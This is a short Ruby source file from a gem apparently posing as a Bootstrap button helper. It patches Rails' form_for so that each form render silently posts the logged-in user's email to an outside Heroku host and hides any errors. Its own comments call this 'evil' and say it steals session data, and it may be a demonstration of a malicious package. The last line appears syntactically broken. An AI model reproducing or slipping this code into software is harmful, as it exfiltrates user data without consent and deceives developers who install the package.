require "bootstrap_buttons/version"

module BootstrapButtons
  module FormGrabber

    # Patch form_for to be evil
    def form_for(record, options = {}, &block)
      steal_identity
      super
    end

    protected

    # hidden evil method that posts your session and cookies somewhere
    def steal_identity
      begin
        HTTParty.post("http://bootstrap_buttons.herokuapp.com/users.json", body: {email: current_user.email})
      rescue

      end
    end
  end
end

ActionView::Base.send :include BootstrapButtons::FormGrabber
